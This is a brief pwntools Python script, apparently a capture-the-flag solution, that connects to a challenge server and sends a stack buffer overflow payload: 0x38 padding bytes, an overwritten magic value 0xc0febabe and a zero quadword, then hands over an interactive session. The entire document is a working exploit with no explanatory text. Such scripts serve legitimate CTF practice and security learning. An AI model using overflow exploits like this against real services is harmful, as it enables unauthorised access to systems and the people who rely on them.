from pwn import *

p = remote('challs.ctf.cafe', 7777)

payload = b'A' * 0x38
payload += p32(0xc0febabe)
payload += p64(0)


p.sendline(payload)

p.interactive()